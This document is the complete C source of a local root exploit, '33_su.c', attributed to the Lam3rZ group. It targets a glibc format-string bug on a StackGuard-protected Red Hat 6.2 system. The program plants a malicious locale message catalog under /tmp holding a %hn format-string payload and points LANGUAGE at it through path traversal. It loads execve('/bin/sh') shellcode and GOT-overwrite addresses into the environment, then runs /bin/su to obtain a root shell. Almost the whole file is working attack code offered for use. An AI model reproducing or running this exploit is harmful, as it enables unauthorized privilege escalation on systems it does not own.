/* 33_su.c exploit for LC glibc format string bug
   it works on StackGuarded version of RH 6.2
   called ImmunixOS (http://www.immunix.org/)
   Exploit (c)Lam3rZ Group by Kil3r of Lam3rZ

   it's the first public sploit that bypases
   StackGuard protection in real world
   it is also a proof of concept described long time ago in Lam3rZ's Phrack
   article "BYPASSING STACKGUARD AND STACKSHIELD" by Bulba and Kil3r
   [http://phrack.infonexus.com/search.phtml?view&article=p56-5]


   greetz: warning3, scut, stealth, bulba, tmoggie, nises, wasik (aka synek ;),
   and teso team, LSD team, HERT, padnieta babcia, z33d,
   lcamtuf aka postawflaszke, clubbing.pl, Lucek Skajuoker (wracaj do
   zdrowia!).

   Special greets go to Crispin Cowan

   Disclaimer: THIS is Lam3rZ style (famouce one). Lam3rz style DO NOT
   exploit bash, do not use bash and does nothing to do with bash scripts!
   Lam3rZ sploits do not like to take any arguments it confuses lamers!


   qwertz ?
   zes !

*/
// lamer:
// compile it as a regular user on a box and it should work! :)

// lam3r:
// read the code carefully and have a fun! :)


#include <stdio.h>

#define EXIT_GOT      	0x804c624
#define WHERESHELLCODE  0xbfffff81

#define ENV             "LANGUAGE=fi_FI/../../../../../../tmp"
#define PATH             "/tmp/LC_MESSAGES"



char *env[11];
char code[]=
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
char hacker[]="\x24\xc6\x04\x08\x89\x89\x89\x89\x25\xc6\x04\x08\x89\x89\x89\x89\x26\xc6\x04\x08\x89\x89\x89\x89\x27\xc6\x04\x08\x44\x44\x44";

main () {
char buf[1024];
FILE *fp;

if(mkdir(PATH,0755) < 0)
{
perror("mkdir");
}
chdir(PATH);
if( !(fp = fopen("libc.po", "w+")))
{
perror("fopen");
exit(1);
}

strcpy(buf,"%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%dAAAA%226d%hn%126d%hn%256d%hn%192d%hn");

fprintf(fp,"msgid \"%%s: invalid option -- %%c\\n\"\n");
fprintf(fp,"msgstr \"%s\\n\"", buf);
fclose(fp);


system("/usr/bin/msgfmt libc.po -o libc.mo");
env[1]=ENV;
env[0]=code;
env[2]=hacker;
env[3]=NULL;
printf("ZAJEBI�CIE!!!\nA teraz b�dziesz le�a� i ta�czy� r�czk�!\n");
execle("/bin/su","su","-u", NULL,env);
}

